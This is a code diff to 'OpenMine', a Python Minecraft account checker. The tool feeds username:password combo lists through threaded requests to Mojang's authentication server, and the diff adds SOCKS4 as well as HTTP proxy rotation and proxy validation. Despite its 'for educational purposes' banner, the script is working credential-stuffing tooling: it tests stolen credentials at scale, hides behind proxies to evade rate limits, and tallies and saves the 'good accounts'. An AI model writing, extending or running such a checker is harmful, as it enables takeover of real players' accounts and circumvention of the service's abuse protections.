@@ -2,7 +2,6 @@ import threading, requests, json
 import ctypes, time, os, sys
 from colorama import Fore, init, Style
 from requests.exceptions import ConnectionError
-from json.decoder import JSONDecodeError
 
 logo = '''
  ██████╗ ██████╗ ███████╗███╗   ██╗███╗   ███╗██╗███╗   ██╗███████╗
@@ -36,6 +35,7 @@ class Minecraft:
         self.invalid = 0
         self.combocounter = 0
         self.proxycounter = 0
+        self.proxytype = 0
         self.connectionerror = 0
         self.valid = 0
         self.ticker = 0
@@ -79,7 +79,8 @@ class Minecraft:
     def update_proxyon(self): 
         os.system('cls' if os.name == 'nt' else 'clear')
         activeip, activeport = (self.get_latest_proxy()).split(':')
-        print(f'''
+        if self.proxytype == 1:
+            print(f'''
  ██████╗ ██████╗ ███████╗███╗   ██╗███╗   ███╗██╗███╗   ██╗███████╗
 ██╔═══██╗██╔══██╗██╔════╝████╗  ██║████╗ ████║██║████╗  ██║██╔════╝
 ██║   ██║██████╔╝█████╗  ██╔██╗ ██║██╔████╔██║██║██╔██╗ ██║█████╗  
@@ -89,12 +90,32 @@ class Minecraft:
 Version v1.0
 A lightweight & open-source minecraft account checker for educational purposes.
 
-HTTP PROXY IS {bcolors.OKGREEN}ACTIVE{bcolors.ENDC} - {bcolors.UNDERLINE}{activeip}:{activeport}{bcolors.ENDC}
+HTTP/HTTPS PROXY IS {bcolors.OKGREEN}ACTIVE{bcolors.ENDC} - {bcolors.UNDERLINE}{activeip}:{activeport}{bcolors.ENDC}
 OpenMine is running - [{bcolors.OKBLUE}{self.valid + self.invalid + self.connectionerror}{bcolors.ENDC}/{len(self.usernames)}] checked accounts.
                       [{bcolors.OKGREEN}{self.valid}{bcolors.ENDC}/{len(self.usernames)}] good accounts.
                       [{bcolors.FAIL}{self.invalid}{bcolors.ENDC}/{len(self.usernames)}] bad accounts.
                       [{bcolors.FAIL}{self.connectionerror}{bcolors.ENDC}/{len(self.usernames)}] proxy errors.
         ''')
+        if self.proxytype == 2:
+            print(f'''
+ ██████╗ ██████╗ ███████╗███╗   ██╗███╗   ███╗██╗███╗   ██╗███████╗
+██╔═══██╗██╔══██╗██╔════╝████╗  ██║████╗ ████║██║████╗  ██║██╔════╝
+██║   ██║██████╔╝█████╗  ██╔██╗ ██║██╔████╔██║██║██╔██╗ ██║█████╗  
+██║   ██║██╔═══╝ ██╔══╝  ██║╚██╗██║██║╚██╔╝██║██║██║╚██╗██║██╔══╝  
+╚██████╔╝██║     ███████╗██║ ╚████║██║ ╚═╝ ██║██║██║ ╚████║███████╗
+ ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═══╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝
+Version v1.0
+A lightweight & open-source minecraft account checker for educational purposes.
+
+SOCKS4 PROXY IS {bcolors.OKGREEN}ACTIVE{bcolors.ENDC} - {bcolors.UNDERLINE}{activeip}:{activeport}{bcolors.ENDC}
+OpenMine is running - [{bcolors.OKBLUE}{self.valid + self.invalid + self.connectionerror}{bcolors.ENDC}/{len(self.usernames)}] checked accounts.
+                      [{bcolors.OKGREEN}{self.valid}{bcolors.ENDC}/{len(self.usernames)}] good accounts.
+                      [{bcolors.FAIL}{self.invalid}{bcolors.ENDC}/{len(self.usernames)}] bad accounts.
+                      [{bcolors.FAIL}{self.connectionerror}{bcolors.ENDC}/{len(self.usernames)}] proxy errors.
+        ''')
+        if self.proxytype == 0:
+            print(f'{bcolors.FAIL}! Proxy type unknown')
+            exit()
 
     def update_proxyoff(self):
         os.system('cls' if os.name == 'nt' else 'clear')
@@ -108,7 +129,7 @@ OpenMine is running - [{bcolors.OKBLUE}{self.valid + self.invalid + self.connect
 Version v1.0
 A lightweight & open-source minecraft account checker for educational purposes.
 
-PROXYLESS IS {bcolors.OKGREEN}ACTIVE{bcolors.ENDC}
+PROXYLESS IS {bcolors.OKGREEN}ACTIVE{bcolors.ENDC}\n
 OpenMine is running - [{bcolors.OKBLUE}{self.valid + self.invalid + self.connectionerror}{bcolors.ENDC}/{len(self.usernames)}] checked accounts.
                       [{bcolors.OKGREEN}{self.valid}{bcolors.ENDC}/{len(self.usernames)}] good accounts.
                       [{bcolors.FAIL}{self.invalid}{bcolors.ENDC}/{len(self.usernames)}] bad accounts.
@@ -118,10 +139,16 @@ OpenMine is running - [{bcolors.OKBLUE}{self.valid + self.invalid + self.connect
     
     def check_proxies(self, ip, port):
         try:
-            proxies = {'http': f"{ip}:{port}"}
+            if self.proxytype == 1:
+                proxies = {'http': f"{ip}:{port}"}
+            if self.proxytype == 2:
+                proxies = {'http': f"socks4://{ip}:{port}"}
+            if self.proxytype == 0:
+                print(f'{bcolors.FAIL}! Proxy type unknown')
+                exit()
             requests.get('https://authserver.mojang.com/', proxies=proxies)
             self.workingproxies.append(f'{ip}:{port}')
-        except ConnectionError:
+        except requests.exceptions.ConnectionError:
             pass
 
     
@@ -130,8 +157,15 @@ OpenMine is running - [{bcolors.OKBLUE}{self.valid + self.invalid + self.connect
             data = json.dumps({"agent":{"name":"Minecraft","version":1}, "username":username,"password":password,"requestUser":"true"})
             headers = {'Content-Type': 'application/json'}
             activeip, activeport = (self.get_latest_proxy()).split(':')
+            if self.proxytype == 1:
+                proxies = {'http': f"{activeip}:{activeport}"}
+            if self.proxytype == 2:
+                proxies = {'http': f"socks4://{activeip}:{activeport}"}
+            if self.proxytype == 0:
+                print(f'{bcolors.FAIL}! Proxy type unknown')
+                exit()
             try:
-                checkraw = requests.post("https://authserver.mojang.com/authenticate", data=data, headers=headers, proxies = {'http': f"{activeip}:{activeport}"})
+                checkraw = requests.post("https://authserver.mojang.com/authenticate", data=data, headers=headers, proxies=proxies)
                 checkjson = json.loads(checkraw.text)
                 if "clientToken" in checkraw.text:
                     gameuser = checkjson['selectedProfile']['name']
@@ -154,7 +188,7 @@ OpenMine is running - [{bcolors.OKBLUE}{self.valid + self.invalid + self.connect
                         self.ticker = 0
                         self.update_proxyon()
                     
-            except ConnectionError:
+            except requests.exceptions.ConnectionError:
                 self.connectionerror += 1
                 if self.checkproxies == 'y':
                     self.ticker += 1
@@ -170,7 +204,7 @@ OpenMine is running - [{bcolors.OKBLUE}{self.valid + self.invalid + self.connect
                         self.ticker = 0
                         self.update_proxyon()
 
-            except JSONDecodeError:
+            except json.decoder.JSONDecodeError:
                 self.connectionerror += 1
                 if self.checkproxies == 'y':
                     self.ticker += 1
@@ -185,6 +219,11 @@ OpenMine is running - [{bcolors.OKBLUE}{self.valid + self.invalid + self.connect
                     if self.ticker >= (0.8*self.threads):
                         self.ticker = 0
                         self.update_proxyon()
+
+            except IndexError:
+                input(f'Ran out of {bcolors.WARNING}working proxies{bcolors.ENDC}, press any key to exit...')
+                exit()
+                
 
                     
         else:
@@ -214,7 +253,7 @@ OpenMine is running - [{bcolors.OKBLUE}{self.valid + self.invalid + self.connect
                         self.ticker = 0
                         self.update_proxyoff()
                     
-            except ConnectionError:
+            except requests.exceptions.ConnectionError:
                 self.connectionerror += 1
                 self.ticker += 1
                 self.update_title("OpenMine - Minecraft Account Checker | Valid: {} | Invalid: {} | Checked: {}/{} | Remaining: {}".format(self.valid, self.invalid, (self.valid + self.invalid + self.connectionerror), len(self.usernames), (len(self.usernames) - (self.valid + self.invalid + self.connectionerror))))
@@ -222,7 +261,7 @@ OpenMine is running - [{bcolors.OKBLUE}{self.valid + self.invalid + self.connect
                     self.ticker = 0
                     self.update_proxyoff()
 
-            except JSONDecodeError:
+            except json.decoder.JSONDecodeError:
                 self.connectionerror += 1
                 self.ticker += 1
                 self.update_title("OpenMine - Minecraft Account Checker | Valid: {} | Invalid: {} | Checked: {}/{} | Remaining: {}".format(self.valid, self.invalid, (self.valid + self.invalid + self.connectionerror), len(self.usernames), (len(self.usernames) - (self.valid + self.invalid + self.connectionerror))))
@@ -236,9 +275,14 @@ OpenMine is running - [{bcolors.OKBLUE}{self.valid + self.invalid + self.connect
         if self.checkproxies == 'y':
             def proxy_thread_starter():
                 self.check_proxies(self.ip[self.proxycounter], self.port[self.proxycounter])
-
-            print(f"{bcolors.OKGREEN}> {bcolors.ENDC}Please wait as we check your proxylist validity...")
-            while True:
+            if self.proxytype == 1:
+                print(f"{bcolors.OKGREEN}> {bcolors.ENDC}Please wait as we check your HTTP/HTTPS proxylist validity...")
+            if self.proxytype == 2:
+                print(f"{bcolors.OKGREEN}> {bcolors.ENDC}Please wait as we check your SOCKS4 proxylist validity...")
+            if self.proxytype == 0:
+                print(f'{bcolors.FAIL}! Proxy type unknown')
+                exit()
+            while(True):
                 if threading.active_count() <= self.threads:
                     threading.Thread(target = proxy_thread_starter).start()
                     self.proxycounter += 1
@@ -248,7 +292,7 @@ OpenMine is running - [{bcolors.OKBLUE}{self.valid + self.invalid + self.connect
             with open("proxies.txt") as g:
                 for line in g:
                     self.workingproxies.append(line)
-        while True:
+        while(True):
             if threading.active_count() <= self.threads:
                 threading.Thread(target = combo_thread_starter).start()
                 self.combocounter += 1
@@ -277,11 +321,14 @@ OpenMine is running - [{bcolors.OKBLUE}{self.valid + self.invalid + self.connect
         print("A lightweight & open-source minecraft account checker for educational purposes.\n")
         load_combo = self.load_combos()
         if load_combo is not None:
-            asksettings=True
             while(True):
                 try: 
                     self.threads = int(input(f"{bcolors.WARNING}> {bcolors.ENDC}Threads: "))
                     self.saveusername = (input(f"{bcolors.WARNING}> {bcolors.ENDC}Save usernames? (y/n): "))
+                    if self.saveusername == 'y':
+                            pass
+                    else:
+                        self.saveusername = 'n'
                     self.useproxies = (input(f"{bcolors.WARNING}> {bcolors.ENDC}Use proxies? (Rotating proxies are recommended) (y/n): "))
                     if self.useproxies == 'y':
                         load_proxy = self.load_proxies()
@@ -289,6 +336,15 @@ OpenMine is running - [{bcolors.OKBLUE}{self.valid + self.invalid + self.connect
                             pass
                         else:
                             os.system('cls' if os.name == 'nt' else 'clear'); update_title("OpenMine - Minecraft Account Checker | Error"); print(f"{bcolors.FAIL}Error\n{bcolors.ENDC}Please put your proxies inside of 'proxies.txt'"); time.sleep(10); exit()
+                        while(True):
+                            print(f'[1] HTTP/HTTPS')
+                            print(f'[2] SOCKS4')
+                            self.proxytype = int(input(f"{bcolors.WARNING}> {bcolors.ENDC}Please enter the number corresponding to the proxy type: "))
+                            if self.proxytype == 1 or self.proxytype == 2:
+                                break
+                            else:
+                                print(f'{bcolors.FAIL}! Please enter 1 or 2')
+                                continue
                         self.checkproxies = (input(f"{bcolors.WARNING}> {bcolors.ENDC}Check proxies? (Do not use for rotating proxies) (y/n): "))
                         if self.checkproxies == 'y':
                             pass
